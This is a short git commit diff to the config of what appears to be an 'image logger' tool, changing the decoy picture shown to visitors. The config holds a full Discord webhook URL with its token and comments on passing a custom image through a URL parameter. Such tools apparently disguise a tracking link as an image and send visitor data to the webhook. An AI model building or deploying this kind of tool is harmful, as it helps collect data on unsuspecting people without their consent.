4708c8e5696d14685ac611a00e8e5480f8b5e313
blooddrizzy <bloodyrazor6@gmail.com>
2025-05-05 10:42:55 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -14,7 +14,7 @@
  config = {
      # BASE CONFIG #
      "webhook": "https://discord.com/api/webhooks/1368866549007388712/qQpUYDV8J4TMnRHkdb2sJhGSP5yuivX1DnX8cxJcYLJBgobPpK4VvBt8AhxEC1U9O_Zf-",
-     "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
+     "image": "https://i.pinimg.com/736x/e8/52/76/e85276e4a897db370b65b3568656f5ba.jpg", # You can also have a custom image by using a URL argument
                                                 # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
      "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
  
